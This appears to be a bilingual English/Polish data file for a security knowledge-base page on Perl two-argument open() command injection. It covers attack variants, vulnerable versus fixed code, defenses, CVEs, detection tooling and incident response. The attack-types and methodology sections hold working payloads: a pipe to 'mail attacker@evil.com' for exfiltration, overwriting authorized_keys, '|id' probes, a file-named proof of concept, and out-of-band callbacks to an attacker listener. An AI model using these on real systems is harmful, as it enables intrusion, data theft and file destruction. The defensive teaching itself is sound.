@@ -1,0 +1,395 @@
+meta:
+  id: perlopeninjection
+  threatId: cat_1_research22
+  severity: Critical
+  color: '#166534'
+  colorRgb: 22,101,52
+  cwe: CWE-78
+  cvss: '9.1'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'Perl '
+  titleGrad: open()
+  titleTail: ' Injection'
+  topbar: Perl open() Injection (2-argument "magic open")
+  lead:
+    en: 'Perl''s 2-argument open(FH, EXPR) is "magic": it inspects the single string argument itself to infer the mode -- a leading or trailing <code>|</code> makes Perl hand the rest of the string to <code>/bin/sh -c</code> as a command. A function whose obvious job is opening a file becomes full OS command execution the moment an attacker controls what looks like a "filename" -- no system(), no backticks, nothing a code reviewer scanning for the usual injection sinks would flag. All three independent research passes converged on the same fix (the 3-argument open() form, added in Perl 5.6.0 in 2000) and the same nuance: it is the definitive fix for command injection, but not for path traversal.'
+    pl: 'Dwuargumentowy open(FH, EXPR) w Perlu jest "magiczny": inspekcjonuje sam pojedynczy string argumentu by wywnioskować tryb -- wiodący albo końcowy <code>|</code> sprawia że Perl oddaje resztę stringa do <code>/bin/sh -c</code> jako komendę. Funkcja której oczywistym zadaniem jest otwarcie pliku staje się pełnym wykonaniem komend systemowych w chwili gdy atakujący kontroluje coś co wygląda jak "nazwa pliku" -- brak system(), brak backticków, nic czego recenzent kodu skanujący pod kątem typowych ujść wstrzyknięcia by nie zauważył. Wszystkie trzy niezależne przejścia badawcze zbiegły się na tej samej naprawie (trójargumentowa forma open(), dodana w Perlu 5.6.0 w 2000) i tym samym niuansie: to definitywna naprawa dla wstrzyknięcia komend, ale nie dla przejścia przez ścieżki.'
+  metrics:
+  - k: CWE-78
+    v:
+      en: Weakness ID (+ CWE-73)
+      pl: ID słabości (+ CWE-73)
+  - k: '9.1'
+    v: CVSS · Critical (CVE-2026-8450, HTTP::Daemon)
+  - k: A03:2021
+    v:
+      en: OWASP Top 10 (verified mapping)
+      pl: OWASP Top 10 (zweryfikowane mapowanie)
+  - k: '2000'
+    v:
+      en: 3-arg open() fix, Perl 5.6.0
+      pl: Naprawa open() 3-arg, Perl 5.6.0
+  sources:
+  - label: perldoc — open
+    url: https://perldoc.perl.org/functions/open
+  - label: perldoc — perlsec
+    url: https://perldoc.perl.org/perlsec
+  - label: CWE-78 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/78.html
+  - label: GHSA-3hc6-3p33-wq57 — HTTP::Daemon CVE-2026-8450
+    url: https://github.com/advisories/GHSA-3hc6-3p33-wq57
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Perl's magic-open inspects one string for six different meanings; each interpretation the developer didn't intend is its own attack variant.
+      pl: Magiczny open Perla inspekcjonuje jeden string pod kątem sześciu różnych znaczeń; każda interpretacja której deweloper nie zamierzał jest osobnym wariantem ataku.
+    items:
+    - name: Trailing-pipe -- read command output
+      sev: critical
+      description:
+        en: A string ending in | is treated as a command whose output we read. perldoc's own illustrative example is a user supplying "rsh cat file |" as a filename. This is the classic RCE variant and the one every real CVE in this deep-dive uses.
+        pl: String kończący się | jest traktowany jako komenda której output czytamy. Własny przykład ilustracyjny perldoc to użytkownik podający "rsh cat file |" jako nazwę pliku. To klasyczny wariant RCE i ten którego używa każde prawdziwe CVE w tym deep-dive.
+      payload: 'open(my $fh, $userInput);  # $userInput = "id |"  ->  runs `id` via /bin/sh -c, output readable from $fh'
+    - name: Leading-pipe -- write into a spawned command
+      sev: critical
+      description:
+        en: A string beginning with | spawns a command that reads whatever we subsequently write to the filehandle -- our program's output becomes the injected command's stdin, useful for exfiltration via mail/curl-style commands.
+        pl: String zaczynający się od | uruchamia komendę która czyta cokolwiek następnie zapiszemy do uchwytu pliku -- output naszego programu staje się stdin wstrzykniętej komendy, przydatne do eksfiltracji przez komendy w stylu mail/curl.
+      payload: 'open(my $fh, $userInput); print $fh $data;  # $userInput = "| mail attacker@evil.com"'
+    - name: Write/truncate magic -- arbitrary file destruction (no shell needed)
+      sev: high
+      description:
+        en: A leading > or >> is honored even without any pipe -- an attacker who cannot reach a shell can still truncate or overwrite an arbitrary path the process has permission to write, e.g. an authorized_keys file or an application config.
+        pl: Wiodący > albo >> jest respektowany nawet bez żadnego pipe -- atakujący który nie może dosięgnąć powłoki wciąż może obciąć albo nadpisać dowolną ścieżkę do której proces ma prawo zapisu, np. plik authorized_keys albo konfigurację aplikacji.
+      payload: 'open(my $fh, $userInput);  # $userInput = "> /home/app/.ssh/authorized_keys"'
+    - name: Read-write magic (+<, +>)
+      sev: high
+      description:
+        en: The +< (read-write, no truncate) and +> (read-write, truncate) prefixes are honored identically -- +> silently zeroes an existing file's contents before handing back a read-write handle to it.
+        pl: Prefiksy +< (odczyt-zapis, bez obcięcia) i +> (odczyt-zapis, z obcięciem) są respektowane identycznie -- +> po cichu zeruje zawartość istniejącego pliku zanim odda uchwyt odczytu-zapisu do niego.
+      payload: 'open(my $fh, $userInput);  # $userInput = "+> important.log"  -> zeroes the file before returning a handle'
+    - name: File-named payload -- no HTTP parameter needed
+      sev: critical
+      description:
+        en: 'Verified via CVE-2011-10007 (File::Find::Rule): the string subjected to 2-arg magic doesn''t need to arrive as user input at all -- a file on disk literally NAMED "|id" triggers command execution the moment any script grep()s or iterates the directory and 2-arg-opens each entry name.'
+        pl: 'Zweryfikowane przez CVE-2011-10007 (File::Find::Rule): string poddany magii 2-arg wcale nie musi przybyć jako wejście użytkownika -- plik na dysku dosłownie NAZWANY "|id" wyzwala wykonanie komendy w chwili gdy jakikolwiek skrypt zrobi grep() albo zaiteruje katalog i otworzy 2-arg każdą nazwę wpisu.'
+      payload: '$ echo > "/tmp/poc/|id"
+
+        $ perl -MFile::Find::Rule -E ''File::Find::Rule->grep("foo")->in("/tmp/poc")''  # executes `id`'
+    - name: Deliberate 3-arg pipe misuse -- the one case 3-arg doesn't save you
+      sev: medium
+      description:
+        en: The 3-argument form still supports explicit pipe modes ('-|', '|-'). If a developer deliberately opens a pipe this way and interpolates untrusted data into the command string, it's still command injection -- 3-arg open only removes the ACCIDENTAL/magic vector, not intentional shell invocation built carelessly.
+        pl: Trójargumentowa forma wciąż wspiera jawne tryby pipe ('-|', '|-'). Jeśli deweloper celowo otwiera pipe w ten sposób i interpoluje nieufne dane do stringa komendy, to wciąż wstrzyknięcie komend -- open() 3-arg usuwa tylko wektor PRZYPADKOWY/magiczny, nie celowe wywołanie powłoki zbudowane nieostrożnie.
+      payload: 'open(my $fh, ''-|'', "grep $userPattern /var/log/app.log");  # 3-arg, but $userPattern still shell-interpolated'
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The fix is one word: add a literal mode as its own argument. Everything downstream (allowlisting, taint mode, File::Spec confinement) is defense-in-depth for what the 3-argument form alone doesn''t cover -- path traversal.'
+      pl: 'Naprawa to jedno słowo: dodaj literalny tryb jako własny argument. Wszystko downstream (allowlisting, taint mode, ograniczenie File::Spec) to obrona w głąb dla tego czego sama forma 3-argumentowa nie pokrywa -- przejścia przez ścieżki.'
+    languages:
+    - label: Perl -- classic CGI sink
+      lang: perl
+      vulnerable: '#!/usr/bin/perl
+
+        use CGI;
+
+        my $q = CGI->new;
+
+        my $file = $q->param(''page'');           # attacker-controlled
+
+        open(my $fh, $file) or die $!;          # 2-arg magic: "page=id |" -> runs `id`
+
+        print while <$fh>;'
+      safe: '#!/usr/bin/perl -T                       # taint mode on
+
+        use CGI;
+
+        my $q = CGI->new;
+
+        my $name = $q->param(''page'');
+
+        die "bad name" unless $name =~ /\A([\w.-]+)\z/;  # allowlist + untaint
+
+        $name = $1;
+
+        open(my $fh, ''<'', "/var/www/pages/$name") or die $!;  # 3-arg: literal mode
+
+        print while <$fh>;'
+    - label: Perl -- sysopen alternative
+      lang: perl
+      vulnerable: 'open(my $fh, $userPath);  # 2-arg magic, no matter what mode string is intended'
+      safe: "use Fcntl;\nsysopen(my $fh, $userPath, O_RDONLY)\n  or die $!;  # sysopen never does magic-mode parsing at all"
+    - label: Perl -- taint mode boundary (what it does and does NOT cover)
+      lang: perl
+      vulnerable: '# perl -T is active, $file is tainted (from CGI param)
+
+        open(my $fh, "> $file");   # FATAL: "Insecure dependency" -- taint mode blocks this
+
+        open(my $fh, "echo $file|"); # FATAL: blocked -- pipe use of tainted data'
+      safe: "# Still under -T, but note the honest gap:\nopen(my $fh, \"< $file\");   # ALLOWED even tainted -- perlsec: \"Perl doesn't\n                            # prevent you from opening tainted filenames for reading\"\n                            # taint mode is NOT a substitute for path validation on reads"
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: Legacy Perl CGI scripts are the canonical hunting ground precisely because they predate the 3-argument convention and routinely pass a query parameter straight into open().
+      pl: Klasyczne skrypty Perl CGI to kanoniczny teren łowiecki dokładnie dlatego że poprzedzają konwencję trójargumentową i rutynowo przekazują parametr zapytania wprost do open().
+    steps:
+    - title:
+        en: Identify Perl CGI endpoints and filename-shaped parameters
+        pl: Zidentyfikuj endpointy Perl CGI i parametry w kształcie nazwy pliku
+      description:
+        en: .pl/.cgi extensions, mod_perl handlers, and parameters named file/page/template/log/doc are the classic targets -- 2-arg open() was idiomatic before Perl 5.6.0 (2000) and legacy code copied it forward for decades.
+        pl: Rozszerzenia .pl/.cgi, handlery mod_perl, i parametry nazwane file/page/template/log/doc to klasyczne cele -- 2-arg open() był idiomatyczny przed Perl 5.6.0 (2000) i legacy kod kopiował go dalej przez dekady.
+    - title:
+        en: Reflected confirmation with a trailing pipe
+        pl: Potwierdzenie odbite z końcowym pipe
+      description:
+        en: Append |id or |whoami to a filename-shaped parameter and check whether the command's stdout is reflected in the response body -- the same leak mechanism verified in CVE-2026-8450.
+        pl: Dołącz |id albo |whoami do parametru w kształcie nazwy pliku i sprawdź czy stdout komendy jest odbite w treści odpowiedzi -- ten sam mechanizm wycieku zweryfikowany w CVE-2026-8450.
+    - title:
+        en: Blind/timing and out-of-band confirmation
+        pl: Potwierdzenie ślepe/czasowe i out-of-band
+      description:
+        en: When output is not reflected, inject |sleep 10 and measure latency, or use an out-of-band channel (curl/nslookup to an attacker-controlled listener) to confirm execution.
+        pl: Gdy output nie jest odbity, wstrzyknij |sleep 10 i zmierz opóźnienie, albo użyj kanału out-of-band (curl/nslookup do słuchacza kontrolowanego przez atakującego) by potwierdzić wykonanie.
+    - title:
+        en: Probe write/truncate primitives even without shell access
+        pl: Sonduj prymitywy zapisu/obcięcia nawet bez dostępu do powłoki
+      description:
+        en: If pipe metacharacters are filtered, test leading > / >> / +> / +< against the same parameter -- these require no shell and can still overwrite or truncate an arbitrary writable path.
+        pl: Jeśli metaznaki pipe są filtrowane, przetestuj wiodące > / >> / +> / +< na tym samym parametrze -- one nie wymagają powłoki i wciąż mogą nadpisać albo obciąć dowolną zapisywalną ścieżkę.
+    - title:
+        en: Check for the file-named variant on any directory-iteration code
+        pl: Sprawdź wariant nazwanego pliku na kodzie iterującym katalogi
+      description:
+        en: If an attacker can control a filename on disk that the target later readdir()s and 2-arg-opens (e.g. an upload directory), a file literally named "|cmd" is a direct RCE primitive with no parameter injection required at all.
+        pl: Jeśli atakujący może kontrolować nazwę pliku na dysku którą cel później przeiteruje przez readdir() i otworzy 2-arg (np. katalog uploadów), plik dosłownie nazwany "|cmd" to bezpośredni prymityw RCE bez konieczności jakiegokolwiek wstrzyknięcia parametru.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: The definitive fix is one argument away; everything else is defense-in-depth for what it does not cover (path traversal) or a safety net for code that has not been fixed yet.
+      pl: Definitywna naprawa jest o jeden argument dalej; wszystko inne to obrona w głąb dla tego czego nie pokrywa (przejście przez ścieżki) albo siatka bezpieczeństwa dla kodu który jeszcze nie został naprawiony.
+    items:
+    - rank: 1
+      eff: 98
+      kind: primary
+      label:
+        en: 3-argument open() with a literal, non-pipe mode
+        pl: Trójargumentowy open() z literalnym trybem bez pipe
+      note:
+        en: open($fh, '<', $file) disables magic-mode parsing entirely -- verified across all three research passes as the Perl community/CPANSec/SEI-CERT consensus fix. Eliminates command/pipe injection completely (~100%); does not by itself stop path traversal, and offers no protection if the mode itself (not just the filename) comes from untrusted input.
+        pl: open($fh, '<', $file) całkowicie wyłącza parsowanie trybu magicznego -- zweryfikowane przez wszystkie trzy przejścia badawcze jako konsensusowa naprawa społeczności Perl/CPANSec/SEI-CERT. Eliminuje wstrzyknięcie komend/pipe całkowicie (~100%); samo w sobie nie zatrzymuje przejścia przez ścieżki, i nie daje ochrony jeśli sam tryb (nie tylko nazwa pliku) pochodzi z nieufnego wejścia.
+    - rank: 2
+      eff: 90
+      kind: primary
+      label:
+        en: sysopen() with explicit O_* flag constants
+        pl: sysopen() z jawnymi stałymi flag O_*
+      note:
+        en: Maps directly to the open(2) syscall; the filename is always a literal path with zero magic-string interpretation. A valid alternative to 3-arg open() when finer-grained control (O_CREAT|O_EXCL, etc.) is needed. Still requires separate path-traversal validation.
+        pl: Mapuje się bezpośrednio na wywołanie systemowe open(2); nazwa pliku jest zawsze literalną ścieżką z zerową interpretacją magicznego stringa. Ważna alternatywa dla open() 3-arg gdy potrzebna jest drobniejsza kontrola (O_CREAT|O_EXCL itd.). Wciąż wymaga osobnej walidacji przejścia przez ścieżki.
+    - rank: 3
+      eff: 80
+      kind: strong
+      label:
+        en: Input validation / allowlisting of filenames
+        pl: Walidacja wejścia / allowlisting nazw plików
+      note:
+        en: Constrain to \A[\w.-]+\z, reject path separators, |, <, >, +, and leading/trailing whitespace. Also closes the path-traversal gap that 3-arg open() alone leaves open -- the two defenses are complementary, not redundant.
+        pl: Ogranicz do \A[\w.-]+\z, odrzuć separatory ścieżek, |, <, >, +, i wiodące/końcowe białe znaki. Zamyka też lukę przejścia przez ścieżki którą samo open() 3-arg zostawia otwartą -- te dwie obrony są komplementarne, nie redundantne.
+    - rank: 4
+      eff: 60
+      kind: strong
+      label:
+        en: Taint mode (perl -T)
+        pl: Taint mode (perl -T)
+      note:
+        en: 'Verified precisely against perlsec by all three research passes: fatally blocks tainted data used in pipe-opens and write-opens ("Insecure dependency"), but explicitly PERMITS opening a tainted filename for reading. A strong safety net for the RCE/write facets, not a substitute for validating read paths.'
+        pl: 'Zweryfikowane precyzyjnie względem perlsec przez wszystkie trzy przejścia badawcze: fatalnie blokuje nieufne dane użyte w otwarciach pipe i zapisu ("Insecure dependency"), ale jawnie ZEZWALA na otwarcie nieufnej nazwy pliku do odczytu. Silna siatka bezpieczeństwa dla aspektów RCE/zapisu, nie substytut walidacji ścieżek odczytu.'
+    - rank: 5
+      eff: 55
+      kind: strong
+      label:
+        en: File::Spec / Cwd::abs_path path confinement
+        pl: Ograniczenie ścieżki File::Spec / Cwd::abs_path
+      note:
+        en: Canonicalize and confine the resolved path under a trusted base directory -- addresses path traversal specifically, orthogonal to the injection fix. (Scalar::Util is NOT a path-validation tool despite sometimes being suggested for this -- it provides tainted() for detecting taint, not sanitizing paths.)
+        pl: Kanonikalizuj i ogranicz rozwiązaną ścieżkę pod zaufanym katalogiem bazowym -- adresuje konkretnie przejście przez ścieżki, ortogonalne do naprawy wstrzyknięcia. (Scalar::Util NIE jest narzędziem walidacji ścieżek mimo że czasem jest tak sugerowane -- dostarcza tainted() do wykrywania skażenia, nie sanityzacji ścieżek.)
+    - rank: 6
+      eff: 35
+      kind: weak
+      label:
+        en: Static analysis in CI (Perl::Critic ProhibitTwoArgOpen)
+        pl: Analiza statyczna w CI (Perl::Critic ProhibitTwoArgOpen)
+      note:
+        en: Effective as a gate for catching the pattern before merge, but is Perl-specific tooling with much sparser adoption than mainstream-language SAST -- treat as one layer among several, not the primary control.
+        pl: Skuteczne jako brama wyłapująca wzorzec przed merge, ale to narzędzie specyficzne dla Perla ze znacznie rzadszą adopcją niż SAST głównych języków -- traktuj jako jedną warstwę spośród kilku, nie główną kontrolę.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: 'An honest gap, documented rather than papered over: all three research passes independently found the formally-tracked CVE record specifically isolating 2-arg open() to be thin and recent, dominated by a 2025-2026 CPANSec retroactive audit rather than a deep historical bench, despite the technique itself being documented in perlsec/the Camel book since the mid-1990s.'
+      pl: 'Uczciwa luka, udokumentowana zamiast zamazana: wszystkie trzy przejścia badawcze niezależnie znalazły że formalnie śledzony rejestr CVE izolujący konkretnie 2-arg open() jest szczupły i świeży, zdominowany przez retroaktywny audyt CPANSec z 2025-2026 zamiast głębokiej historycznej ławki, mimo że sama technika jest udokumentowana w perlsec/Camel book od połowy lat 90.'
+    items:
+    - org: HTTP::Daemon (libwww-perl)
+      year: 2026
+      impact: CVE-2026-8450 -- CVSS 9.1 Critical
+      cost: Fixed in 6.17
+      description:
+        en: send_file() used 2-arg open() on a string derived from the request path; magic prefixes gave OS command injection / arbitrary file write at the daemon UID, and the read-pipe form leaked the spawned command's stdout directly into the HTTP response body. Confirmed independently by all three research passes against the GHSA advisory and the actual fix commit switching to open($fh, '<', $file).
+        pl: send_file() używał 2-arg open() na stringu wyprowadzonym ze ścieżki żądania; magiczne prefiksy dawały wstrzyknięcie komend systemowych / dowolny zapis pliku na UID demona, a forma read-pipe wyciekała stdout uruchomionej komendy bezpośrednio do treści odpowiedzi HTTP. Potwierdzone niezależnie przez wszystkie trzy przejścia badawcze względem advisory GHSA i faktycznego commitu naprawy przełączającego na open($fh, '<', $file).
+    - org: File::Find::Rule
+      year: 2011
+      impact: CVE-2011-10007
+      cost: Fixed in 0.35; ~1,700 dependent packages at time of disclosure
+      description:
+        en: 'grep() opened matched filenames with 2-arg open(); a file literally named "|id" on disk triggered command execution during a routine directory scan, with no HTTP parameter involved at all. Confirmed independently by all three research passes -- with a shared honesty flag: despite the "2011" CVE number reflecting when the vulnerable code existed, the CVE itself was only assigned and published in mid-2025 as part of CPANSec''s retroactive audit, not tracked publicly since 2011.'
+        pl: 'grep() otwierał dopasowane nazwy plików przez 2-arg open(); plik na dysku dosłownie nazwany "|id" wyzwalał wykonanie komendy podczas rutynowego skanowania katalogu, bez żadnego zaangażowanego parametru HTTP. Potwierdzone niezależnie przez wszystkie trzy przejścia badawcze -- ze wspólną flagą uczciwości: mimo że numer CVE "2011" odzwierciedla kiedy podatny kod istniał, samo CVE zostało przypisane i opublikowane dopiero w połowie 2025 jako część retroaktywnego audytu CPANSec, nie śledzone publicznie od 2011.'
+    inlineSources:
+    - label: GHSA-3hc6-3p33-wq57 — HTTP::Daemon CVE-2026-8450
+      url: https://github.com/advisories/GHSA-3hc6-3p33-wq57
+    - label: CPANSec — two-arg open() advisory writeup
+      url: https://security.metacpan.org/2025/06/06/two-arg-open.html
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Perl-specific static analysis has one purpose-built, canonical detector for this exact class -- general-purpose SAST has comparatively weak Perl coverage.
+      pl: Statyczna analiza specyficzna dla Perla ma jeden dedykowany, kanoniczny detektor dla dokładnie tej klasy -- generyczny SAST ma porównywalnie słabe pokrycie Perla.
+    sast:
+    - - Perl::Critic::Policy::InputOutput::ProhibitTwoArgOpen
+      - Core Perl::Critic policy; flags open $fh, "<$filename" and recommends the 3-argument literal-mode form. Verified by name against MetaCPAN by all three research passes.
+    - - Perl::Lint
+      - Has an equivalent 2-arg-open detection policy per CPANSec, though the exact rule identifier was not independently confirmed by any research pass.
+    - - Generic grep/regex CI gate
+      - open\s*\([^,]+\) with a single non-filehandle argument is a fast, if noisy, first-pass signal in codebases without Perl::Critic wired into CI.
+    dast:
+    - - Trailing/leading-pipe reflected probing
+      - Append |id or |whoami to filename-shaped parameters and check for command output reflected in the response.
+    - - Timing/blind confirmation
+      - Inject |sleep 10 and measure response latency when output is not reflected.
+    - - Out-of-band confirmation
+      - curl/nslookup callbacks to an attacker-controlled listener when both reflection and timing are unreliable oracles.
+    note:
+      en: <strong>Key signal:</strong> SEI CERT's Perl Coding Standard rule IDS31-PL ("Do not use the two-argument form of open()") is the authoritative, named policy this whole class maps to -- if a codebase audit has never checked for it, treat every open() call taking fewer than 3 arguments as suspect until proven otherwise.
+      pl: <strong>Kluczowy sygnał:</strong> reguła Perl Coding Standard SEI CERT IDS31-PL ("Do not use the two-argument form of open()") to autorytatywna, nazwana polityka do której mapuje się cała ta klasa -- jeśli audyt bazy kodu nigdy jej nie sprawdzał, traktuj każde wywołanie open() z mniej niż 3 argumentami jako podejrzane dopóki nie udowodniono inaczej.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Unlike some threats in this knowledge base where the OWASP category turned out to be a genuine dispute, this one is a clean, verified mapping -- but the CWE side genuinely spans two weaknesses depending on the payload facet, confirmed by the official advisory tagging both on the same real CVE.
+      pl: W przeciwieństwie do niektórych zagrożeń w tej bazie wiedzy gdzie kategoria OWASP okazała się prawdziwym sporem, to jest czyste, zweryfikowane mapowanie -- ale strona CWE naprawdę obejmuje dwie słabości zależnie od aspektu ładunku, potwierdzone przez oficjalne advisory taggujące oba na tym samym prawdziwym CVE.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-78 — OS Command Injection (primary, for the pipe/RCE facet). ChildOf CWE-77 Command Injection, itself under CWE-74. MITRE's own CWE-78 page uses a Perl open($fh, "…$name|") snippet as Demonstrative Example 3 -- confirmed directly on cwe.mitre.org.
+      - CWE-73 — External Control of File Name or Path (co-applies, for the write/truncate/read facets). Verified co-assigned alongside CWE-78 on the CVE-2026-8450 advisory itself, not an inference.
+      - CWE-1178 — Weaknesses Addressed by the SEI CERT Perl Coding Standard, which includes rule IDS31-PL specifically targeting two-argument open().
+    - std: OWASP
+      items:
+      - 'A03:2021 — Injection. Verified via CWE-1347 (the official OWASP-category CWE membership list): CWE-78 is a confirmed member of A03. This is a clean mapping, not a disputed or moved one -- unlike this knowledge base''s Regex Injection/ReDoS or HTTP Parameter Pollution deep-dives.'
+    inlineSources:
+    - label: CWE-78 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/78.html
+    - label: CWE-73 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/73.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active exploitation of a 2-arg open() sink is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji ujścia 2-arg open(), przejdź tę listę od góry.
+    steps:
+    - en: Identify the exact open() call, the parameter/file source feeding it, and whether the pipe (RCE), write (file-tamper), or read (info-disclosure) facet was used
+      pl: Zidentyfikuj dokładne wywołanie open(), źródło parametru/pliku który je zasila, i czy użyto aspektu pipe (RCE), zapisu (manipulacja plikiem), czy odczytu (ujawnienie informacji)
+    - en: Treat any command executed via the pipe facet as running with the full privileges of the Perl process -- audit accordingly, not just the immediate payload
+      pl: Traktuj każdą komendę wykonaną przez aspekt pipe jako działającą z pełnymi uprawnieniami procesu Perl -- przeaudytuj odpowiednio, nie tylko bezpośredni ładunek
+    - en: If the write/truncate facet was used, identify every file the process had write access to and check for tampering, not just the one confirmed
+      pl: Jeśli użyto aspektu zapisu/obcięcia, zidentyfikuj każdy plik do którego proces miał dostęp zapisu i sprawdź pod kątem manipulacji, nie tylko ten potwierdzony
+    - en: Grep the codebase and its CPAN dependencies for every open() call with fewer than 3 arguments, not just the exploited one
+      pl: Przeszukaj bazę kodu i jej zależności CPAN pod kątem każdego wywołania open() z mniej niż 3 argumentami, nie tylko wykorzystanego
+    - en: Confirm whether taint mode (-T) was active -- if so, the pipe/write facets should have been blocked, meaning the read facet or a taint-bypass is the more likely entry point
+      pl: Potwierdź czy taint mode (-T) był aktywny -- jeśli tak, aspekty pipe/zapisu powinny były być zablokowane, co oznacza że aspekt odczytu albo obejście taint jest bardziej prawdopodobnym punktem wejścia
+    - en: Roll out the 3-argument open() fix (or sysopen with explicit flags) codebase-wide before considering the incident closed, not just at the exploited call site
+      pl: Wdróż naprawę open() 3-arg (albo sysopen z jawnymi flagami) w całej bazie kodu zanim uznasz incydent za zamknięty, nie tylko w wykorzystanym miejscu wywołania
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: perldoc — open
+      url: https://perldoc.perl.org/functions/open
+    - label: perldoc — perlsec
+      url: https://perldoc.perl.org/perlsec
+    - label: CWE-78 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/78.html
+    - label: CWE-73 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/73.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: GHSA-3hc6-3p33-wq57 — HTTP::Daemon CVE-2026-8450
+      url: https://github.com/advisories/GHSA-3hc6-3p33-wq57
+    - label: CPANSec — two-arg open() advisory writeup
+      url: https://security.metacpan.org/2025/06/06/two-arg-open.html
+    - label: Perl::Critic::Policy::InputOutput::ProhibitTwoArgOpen (MetaCPAN)
+      url: https://metacpan.org/pod/Perl::Critic::Policy::InputOutput::ProhibitTwoArgOpen
+    - label: SEI CERT Perl Coding Standard — IDS31-PL
+      url: https://wiki.sei.cmu.edu/confluence/display/perl/IDS31-PL.+Do+not+use+the+two-argument+form+of+open()
